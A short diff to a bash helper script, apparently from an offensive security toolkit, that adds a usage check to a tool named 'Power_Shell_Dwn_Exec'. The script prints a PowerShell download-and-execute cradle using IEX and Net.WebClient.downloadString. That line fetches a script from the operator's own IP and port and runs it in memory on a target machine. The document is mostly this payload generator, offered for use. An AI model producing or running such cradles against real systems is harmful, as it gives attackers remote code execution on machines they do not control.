@@ -1,4 +1,8 @@
-#!/bin/bash                                                       
+#!/bin/bash
+if [ $# -eq 0 ]; then
+    echo "Usage: Power_Shell_Dwn_Exec [port to download from] [file name to download]"
+    exit 1
+fi
 IP=$( IP_No_Clip );                      
 New_IP=$( echo -n $IP );                                                                                                              
 echo "powershell.exe \"IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')\"";
